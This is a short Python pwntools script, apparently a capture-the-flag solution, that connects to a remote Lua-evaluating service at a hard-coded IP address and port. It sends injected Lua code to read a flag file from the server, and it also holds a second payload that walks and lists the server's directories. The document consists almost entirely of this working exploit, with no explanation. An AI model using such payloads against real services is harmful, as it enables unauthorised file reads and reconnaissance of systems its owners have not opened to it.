from pwn import * # pip install pwntools
from Crypto.Util.number import *
ip = "103.49.238.77"
#sock = int
sock = 54377

r = remote(ip, sock)

payload = '''
local open = io.open

local function read_file(path)
    local file = open(path, "rb") -- r read mode and b binary mode
    if not file then return nil end
    local content = file:read "*a" -- *a or *all reads the whole file
    file:close()
    return content
end

local fileContent = read_file("/flag-a15a9d35568f3ac79183f8b907ac73fb.txt");
print("hello");
print (fileContent);
'''

payload2 = '''
require'lfs'
for file in lfs.dir[[./]] do
    if lfs.attributes(file,"mode") == "file" then print("found file, "..file)
    elseif lfs.attributes(file,"mode")== "directory" then print("found dir, "..file," containing:")
        for l in lfs.dir("./"..file) do
             print("",l)
        end
    end
end
'''
filename = "flag-a15a9d35568f3ac79183f8b907ac73fb.txt"

payload = payload.split('\n')
r.recvuntil(b'-- BEGIN')

for l in payload:
    r.sendline(l.encode())

r.sendline(b'-- END')

r.interactive()
